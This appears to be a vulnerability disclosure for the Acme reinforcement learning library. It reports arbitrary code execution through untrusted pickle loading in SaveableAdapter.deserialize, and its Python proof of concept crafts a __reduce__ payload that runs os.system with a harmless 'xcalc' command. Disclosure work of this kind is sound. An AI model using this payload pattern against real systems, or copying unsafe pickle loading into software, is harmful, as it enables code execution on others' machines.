# DescriptionAcme is a library of reinforcement learning (RL) agents and agent building blocks. Acme strives to expose simple, efficient, and readable agents, that serve both as reference implementations of popular algorithms and as strong baselines, while still providing enough flexibility to do novel research. The design of Acme also attempts to provide multiple points of entry to the RL problem at differing levels of complexity.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```python
import os
import pickle
#os.system('pip3 install dm-acme')
#os.system('pip3 install dm-sonnet')
from acme.tf import savers
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#Exploiting
pickled = pickle.dumps(ArbitraryCode())
savers.SaveableAdapter.deserialize('hehe',pickled)
```
* `pip3 install dm-acme`
* `python3 exploit.py`
